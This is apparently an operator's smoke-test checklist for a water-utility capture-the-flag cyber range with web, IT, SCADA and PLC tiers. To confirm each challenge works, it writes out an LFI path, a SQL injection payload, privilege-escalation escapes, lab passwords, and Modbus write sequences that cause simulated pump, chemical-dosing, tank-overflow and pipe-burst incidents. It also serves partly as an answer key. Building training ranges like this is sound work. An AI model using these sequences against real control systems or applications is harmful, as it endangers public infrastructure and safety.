# WaterWorks Pipeline — Operator Smoke-Test Checklist

A fast run-through to confirm the lab and every feature work before you hand it to
players. `10.X` = your range network (`X` = range number). Where a check must run
from a pivot host, it's noted — the quickest way is to open an SSH session / SOCKS
proxy to that host once you've walked the path, or just run it from the host's
console via Proxmox.

Tip: `ludus range list --range waterworks` and `ludus range etc-hosts --range waterworks`
give you the live IPs.

---

## 1. Pre-flight (before deploy)

- [ ] `debian-12-x64-server-template` exists: `ludus templates list | grep debian-12-x64-server`
- [ ] `range.yaml` → `network.always_blocked_networks` set to **your** Ludus host LAN
- [ ] Flags/passwords reviewed in `range.yaml` `global_role_vars` (rotate if needed)
- [ ] `ww_sanitize_lockdown_default_account` is **false** while iterating

## 2. Deploy health

- [ ] `./deploy.sh` completes without fatal errors
- [ ] `ludus range list --range waterworks` shows **11 VMs** deployed/started
- [ ] `ludus range errors --range waterworks` is clean
- [ ] No deploy logged an `ludus`/proxy IoC survivor (spot-check one host:
      `grep -R 192.0.2 /etc/apt/` returns nothing)

## 3. Connectivity & segmentation (run from your WireGuard client)

- [ ] VPN up; `ludus user wireguard --range waterworks` config active
- [ ] **Reachable:** `curl -skI http://waterworkspipeline.com` → `200` (ww-web01)
- [ ] **Reachable:** `curl -sI http://10.X.60.10/healthz` → `200` (scoreboard)
- [ ] **Blocked:** `nc -vz -w3 10.X.20.10 445` → fails (corp IT not VPN-reachable)
- [ ] **Blocked:** `nc -vz -w3 10.X.50.10 502` → fails (field not VPN-reachable)
- [ ] **Blocked:** `nc -vz -w3 10.X.40.10 80` → fails (SCADA not VPN-reachable)

> If any "Blocked" check *succeeds*, the WireGuard REJECT rules didn't apply —
> run `./deploy.sh network`.

## 4. Service reachability (each tier answers)

| # | Check | From | Expect |
|---|-------|------|--------|
| [ ] | `curl -s http://waterworkspipeline.com/robots.txt` | VPN | lists `/staging/` |
| [ ] | open `http://10.X.60.10` | VPN | scoreboard loads, 21 challenges |
| [ ] | `smbclient -L //10.X.20.10 -U 'svc_ccrsync%CCRsync#Feb2019'` | web01 | shares listed |
| [ ] | `ssh j.alvarez@10.X.20.20` (`WaterWorks2026!`) | corp | login OK |
| [ ] | `curl -s http://10.X.30.10:8080/login` | corp (VLAN20) | AquaHistorian login |
| [ ] | `ssh -i <dwhitfield key> d.whitfield@10.X.30.20` | it01 | jump-host login |
| [ ] | `curl -s http://10.X.40.10/login` | jump01 | AquaView HMI login |
| [ ] | `nc -vz 10.X.40.10 5900` | jump01 | VNC port open |
| [ ] | `ssh ww-eng01` (as hydra_vendor) | jump01 | eng workstation login |
| [ ] | `mbtool.py 10.X.50.10 srvid` | eng01/SCADA | `CEDAR RIVER INTAKE PS-1 M340` |

## 5. Flag spot-checks (prove each subsystem; one per host)

Run the quick ones; these confirm the planted content deployed correctly.

- [ ] **web_recon:** `curl -s http://waterworkspipeline.com/staging/ | grep -o 'WTR{[^}]*}'`
- [ ] **web_lfi:** `curl -s "http://waterworkspipeline.com/reports/download?file=../.env" | grep -i marker`
- [ ] **fs_engineering:** `smbclient //10.X.20.10/Engineering -U 'svc_ccrsync%CCRsync#Feb2019' -c 'cd Network; get WWP_Network_Overview.txt -'` → has `Document Control ID: WTR{...}`
- [ ] **it_spray:** `cat ~/flag.txt` after `ssh j.alvarez@10.X.20.20`
- [ ] **hist_sqli:** `/trend?tag=' UNION SELECT key, value FROM system_config-- -` returns a `WTR{...}` + the SCADA token
- [ ] **jump_vendor:** on jump01, `sudo -u hydra_vendor /usr/bin/less /opt/hydra/logs/*.log` → `!sh` → `cat ~/flag.txt`
- [ ] **hmi_access:** log into HMI `controlroom`/`Cedar2019!` → Shift Log page shows `WTR{...}`
- [ ] **plc01_devid:** `mbtool.py 10.X.50.10 devid --code 4 --obj 6` → `CEDAR_INTAKE_PS1 WTR{...}`
- [ ] **plc02_pcom:** `pcom_client.py 10.X.50.20 rw 3000 24 --text` → `WTR{...}` (PCOM only)

## 6. Privesc paths (each gives root/next account)

- [ ] **web_root:** `sudo -l` on web01 shows `NOPASSWD: /usr/bin/rsync`; GTFOBins → root
- [ ] **it_root:** `/opt/it-scripts/nightly_config_backup.sh` is group-writable (helpdesk) + runs via `/etc/cron.d/it-config-backup` every minute
- [ ] **eng_root:** `ls -l /usr/local/bin/projbackup` is `-rwsr-xr-x root`; PATH-hijack `tar` → root
- [ ] **jump pivot:** `less` has no `LESSSECURE` set (`sudo -u hydra_vendor less ...` escapes)

## 7. OT impacts (the payoff — each should latch a flag + raise an HMI alarm)

Run from SCADA/eng. Keep the HMI **Alarms** page open — captured-impact flags
appear there live. Each event self-restores after ~10 min (`ww_plc_event_hold_s`).

- [ ] **impact_drypump** (ww-plc01): `wc 10 0`, `wh 0 1`, `wh 15 0`, `wc 0 1`; wait ~90s → `rh 9000 24 --text` shows `WTR{...}`
- [ ] **impact_naoh** (ww-plc02): `wc 2 0`, `wh 1 11100`; wait ~40s → pH (`rh 3 1`) climbs >1100, `rh 930 24 --text` shows flag
- [ ] **impact_deface** (ww-plc02): write ASCII to MI 900-923 → `rh 960 24 --text` shows flag
- [ ] **impact_overflow** (ww-rtu03): `wh 20 8042`, `wc 11 0`, pumps HAND on; wait ~2-3 min → tank `ri 4 1` hits 3800, `rh 9000 24 --text` shows flag
- [ ] **impact_mainbreak** (ww-rtu03): maint key, `wc 10 0`, `wc 12 0`, `wh 3 500`, pumps on, valve open, then `wh 2 0` (slam) → `ri 6 1` peak >2400, `rh 9032 24 --text` shows flag
- [ ] **self-restore:** re-read a triggered event block after ~10 min → back to engineered defaults (replayable)

(Full commands for each: see [WALKTHROUGH.md](WALKTHROUGH.md) §5.)

## 8. Scoreboard

- [ ] Register a team; log in
- [ ] Submit a correct flag → accepted + points awarded
- [ ] Submit a wrong flag → rejected; 10-wrong/min rate limit works
- [ ] Intel flag is case-insensitive (`wtr{11100}` accepted)
- [ ] Public scoreboard ranks teams, shows first-blood + per-category progress
- [ ] `/admin` (user `admin` / your `ww_scoreboard_admin_password`) loads; CSV export works
- [ ] Rules-of-engagement page lists scope (VLANs 10-50 in scope; scoreboard + router out)

## 9. Immersion / anti-IoC

- [ ] MOTD on each host shows the WaterWorks banner (no platform name)
- [ ] `grep -ri ludus /etc/ /opt/ /home/` on a host → only in-world content, no build tooling
- [ ] No stray `localuser`; scenario users + planted histories intact
- [ ] (Optional, final) set `ww_sanitize_lockdown_default_account: true`, `./deploy.sh roles`, then confirm `ssh debian@<host>` with password `debian` is refused

## 10. Reset between teams

- [ ] `ludus testing start --range waterworks` → `ludus testing stop --range waterworks` reverts cleanly (snapshot-based; works even after default-account lockdown)
- [ ] OR just let impacts auto-restore (~10 min) — no reset needed for replays

---

### 60-second "is it alive?" quick test (from VPN)

```bash
curl -skI http://waterworkspipeline.com | head -1          # DMZ web up
curl -sI  http://10.X.60.10/healthz | head -1              # scoreboard up
curl -s http://waterworkspipeline.com/staging/ | grep -o 'WTR{[^}]*}'   # content seeded
nc -vz -w3 10.X.50.10 502 2>&1 | grep -q succeeded && echo "SEGMENTATION BROKEN" || echo "segmentation OK"
```
